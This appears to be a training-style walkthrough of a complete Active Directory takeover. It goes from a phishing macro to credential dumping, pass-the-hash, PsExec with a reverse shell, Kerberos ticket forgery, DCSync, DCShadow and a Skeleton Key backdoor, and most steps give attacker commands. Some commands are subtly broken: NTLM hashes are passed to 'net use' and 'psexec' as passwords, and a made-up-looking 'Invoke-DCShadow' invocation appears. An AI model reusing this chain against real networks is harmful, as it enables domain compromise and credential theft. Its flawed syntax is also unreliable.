Putting It All Together: AD Attack Scenario

Scenario 1: Multi‑Stage AD Takeover / Full Chain Analysis

1- Initial Foothold (Phishing → Payload → User Access)

  • Attacker crafts a spear‑phishing email containing a malicious Office macro.
  • Victim (UserA) opens the attachment → macro drops evil.exe into C:\Users\UserA\AppData\Temp\.
  • Code execution is achieved on Host A under UserA’s context, establishing the initial foothold.

2- Credential Harvesting & Pass‑the-Hash (PtH)

  • Run Mimikatz to dump credentials from LSASS:

``powershell mimikatz # sekurlsa::logonpasswords ``

  • Extract the NTLM hash for a privileged user (e.g., CORP\Admin).
  • Reuse the hash to authenticate to remote hosts via administrative shares:

``powershell net use Z: \\HOST-B\C$ /user:CORP\Admin <admin_hash> ``

  • The attacker now has file-system-level access to Host B.

3- Lateral Movement via PsExec

  • Copy a reverse-shell to Host B:

``powershell Copy-Item .\rev.exe Z:\Windows\Temp\rev.exe ``

  • Execute remotely using PsExec (leveraging ADMIN$ share + RPC):

``powershell psexec \\HOST-B -u CORP\Admin -p <admin_hash> C:\Windows\Temp\rev.exe ``

  • SYSTEM-level access is gained on Host B, enabling further attack stages.

4- Kerberoasting (Offline Service Account Password Recovery)

  • Enumerate SPNs across the domain:

``powershell Get-ADUser –Filter * –Properties ServicePrincipalName | ? { $_.ServicePrincipalName } ``

  • Request TGS for each SPN and export for offline cracking.
  • Focus on accounts with RC4 encryption (etype 0x17) for higher crackability.
  • Offline attack retrieves service-account NTLM passwords.

5- AS‑REP Roasting (Non-Preauthentication Accounts)

  • Identify accounts without Kerberos preauthentication:

``powershell Get-ADUser -Filter {DONT_REQ_PREAUTH -eq $True} ``

  • Request AS‑REP responses and perform offline cracking using tools like Rubeus or Hashcat.
  • Targeted accounts may reveal high-privilege credentials.

6- Overpass-the-Hash (Pass the TGT via NTLM Hash)

  • Use a captured NTLM hash to request a fresh Kerberos TGT without knowing the plaintext password:

``powershell Rubeus.exe asktgt /user:svc_sql /rc4:<svc_sql_hash> /domain:CORP.LOCAL ``

  • Gains valid Kerberos tickets for lateral movement and service access.

7- Pass‑the‑Ticket & Silver Ticket

  • Pass‑the‑Ticket (PtT): Inject a stolen TGT into memory for seamless access.
  • Silver Ticket: Forge TGS for CIFS, HTTP, or other service accounts to bypass domain controllers entirely.
  • Enables stealthy access to specific hosts or services without exposing DCs.

8- DCSync (Domain Replication Attack)

  • Impersonate a domain controller and request replication data:

``powershell mimikatz # lsadump::dcsync /user:krbtgt ``

  • Extract all domain password hashes (NTLM/LM) and service account credentials.
  • This technique does not require direct exploitation of DC software vulnerabilities—abuse of replication rights is sufficient.

9- Golden Ticket (Persistent Domain-Wide TGT)

  • Forge a TGT for any account (e.g., CORP\Admin) using the krbtgt hash:

``powershell Mimikatz # kerberos::golden /user:Administrator /domain:CORP.LOCAL /sid:S-1-5-21-... /krbtgt:<krbtgt_hash> ``

  • Allows unlimited authentication across the domain, even after password changes.
  • Ticket lifetime is controlled by the attacker (default Mimikatz: 10 years).

10- DCShadow (Active Directory Object Injection)

  • Register a rogue DC and push arbitrary AD changes:

``powershell Invoke-DCShadow -DomainController dc01.corp.local -CreateAccount Backdoor -AddToGroup "Domain Admins" ``

  • Changes appear legitimate because the domain controller itself propagates them.
  • Provides stealthy persistence and privilege escalation.

11- Skeleton Key Implant

  • Implant a malicious patch into LSASS on a domain controller.
  • The patch accepts a “universal master password” for any account, bypassing normal authentication.
  • Allows stealthy, persistent domain-wide access even if passwords are changed.

End Result

By chaining:

  • Shares-based lateral movement
  • NTLM hash reuse
  • Kerberos abuses (Kerberoasting, AS-REP Roasting, Overpass-the-Hash, PtT/Silver/Golden Tickets)
  • Directory-level attacks (DCSync, DCShadow, Skeleton Key),

the attacker achieves complete, persistent domain-admin control with backdoor access to all AD resources.
